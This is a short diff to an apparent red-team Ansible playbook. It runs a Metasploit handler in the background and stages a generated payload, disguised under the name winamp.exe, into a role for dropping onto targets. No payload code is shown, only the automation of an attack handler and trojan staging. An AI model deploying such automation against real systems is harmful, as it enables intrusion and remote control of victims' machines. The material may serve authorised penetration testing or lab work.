@@ -15,11 +15,24 @@
       exploit -j
 
 - name: Execute Metasploit and run script
-  ansible.builtin.shell: msfconsole -r /home/red/https-handler.rc
+  ansible.builtin.shell: nohup msfconsole -r /home/red/https-handler.rc &
   async: 10
+  polling: 0
 
 - name: Retrive payload file to ansible server for staging
   fetch:
     src: /home/red/winamp.exe
-    dest: ./ansible/roles/misc/msf-drop-payload/files/winamp.exe
+    dest: /tmp/winamp.exe
     flat: yes
+
+- name: Copy file to role
+  copy:
+    src: /tmp/winamp.exe
+    dest: ./ansible/roles/misc/msf-drop-payload/files/winamp.exe
+  delegate_to: 127.0.0.1
+
+- name: Clean-up file in tmp
+  file:
+    path: /tmp/winamp.exe
+    state: absent
+  delegate_to: 127.0.0.1
